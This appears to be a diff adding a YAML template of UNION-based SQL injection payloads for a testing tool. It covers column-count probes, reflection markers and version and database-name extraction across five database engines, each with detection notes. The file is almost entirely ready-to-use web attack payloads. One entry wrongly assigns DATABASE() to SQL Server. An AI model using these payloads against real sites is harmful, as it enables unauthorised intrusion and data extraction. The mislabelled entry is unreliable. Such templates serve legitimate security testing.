@@ -1,0 +1,85 @@
+# UNION extraction. Two phases, and they are not interchangeable: resolve the
+# arity first, then find which column reaches the page. Guessing either wastes
+# the other.
+#
+# {{N}} is the column count under test and {{MARKER}} a value chosen by the
+# tester. Use a computed marker rather than a literal one -- a literal proves
+# only that the template echoes input.
+id: sqli/union
+reviewed: "2026-08-23"   # not re-verified since; treat as unreviewed, not current
+title: UNION-based extraction payloads
+variables: [N, MARKER]
+credits:
+  - "Arity resolution and reflection mapping follow long-standing public technique; entries are written for this project."
+entries:
+  - name: column count probe
+    payload: "' ORDER BY {{N}}--"
+    detect: "Error appears once N exceeds the column count."
+
+  - name: column count probe (Oracle)
+    dbms: [oracle]
+    payload: "' ORDER BY {{N}}--"
+    detect: "Same intent; Oracle's error text names an invalid identifier or position rather than a column count."
+
+  - name: NULL-padded arity probe
+    dbms: [mysql, postgresql, mssql, sqlite]
+    payload: "' UNION SELECT NULL--"
+    detect: "Add one NULL per attempt until the response stops erroring; the successful arity is the column count."
+    note: "Use when ORDER BY is filtered. NULL is type-agnostic, which matters on engines that check types across UNION arms."
+
+  - name: NULL-padded arity probe (Oracle)
+    dbms: [oracle]
+    payload: "' UNION SELECT NULL FROM dual--"
+    detect: "Same probe; Oracle requires a FROM clause, so dual supplies one."
+
+  - name: reflection marker
+    dbms: [mysql, postgresql, mssql, sqlite]
+    payload: "' UNION SELECT '{{MARKER}}'--"
+    detect: "Move the marker across column positions at the resolved arity until it appears in the response body."
+    note: "Pad the remaining positions with NULL. The position that renders is the one that carries extracted values."
+
+  - name: reflection marker (Oracle)
+    dbms: [oracle]
+    payload: "' UNION SELECT '{{MARKER}}' FROM dual--"
+    detect: "Same intent with Oracle's mandatory FROM clause."
+
+  - name: computed marker
+    payload: "' UNION SELECT 1337*7--"
+    detect: "Returns 9359 only if the database evaluated it. A template echoing input cannot produce this value, which is what separates reflection from injection."
+    note: "Prefer this over a literal marker as the first reflection test."
+
+  - name: version extraction
+    dbms: [mysql]
+    payload: "' UNION SELECT NULL,@@version-- "
+    detect: "The engine version appears at the reflected column position."
+
+  - name: version extraction
+    dbms: [postgresql]
+    payload: "' UNION SELECT NULL,version()--"
+    detect: "The engine version appears at the reflected column position."
+
+  - name: version extraction
+    dbms: [mssql]
+    payload: "' UNION SELECT NULL,@@version--"
+    detect: "The engine version appears at the reflected column position."
+
+  - name: version extraction
+    dbms: [oracle]
+    payload: "' UNION SELECT NULL,banner FROM v$version--"
+    note: "Oracle requires FROM; use FROM dual when no table is needed."
+
+  - name: version extraction
+    dbms: [sqlite]
+    payload: "' UNION SELECT NULL,sqlite_version()--"
+    detect: "The engine version appears at the reflected column position."
+
+  - name: current database name
+    dbms: [mysql, mssql]
+    payload: "' UNION SELECT NULL,DATABASE()--"
+    detect: "Names the current schema, which is a second metadata proof independent of the version string."
+    note: "SQL Server also accepts DB_NAME(); either is sufficient as proof."
+
+  - name: current database name
+    dbms: [postgresql]
+    payload: "' UNION SELECT NULL,current_database()--"
+    detect: "Names the current database, as a second metadata proof."
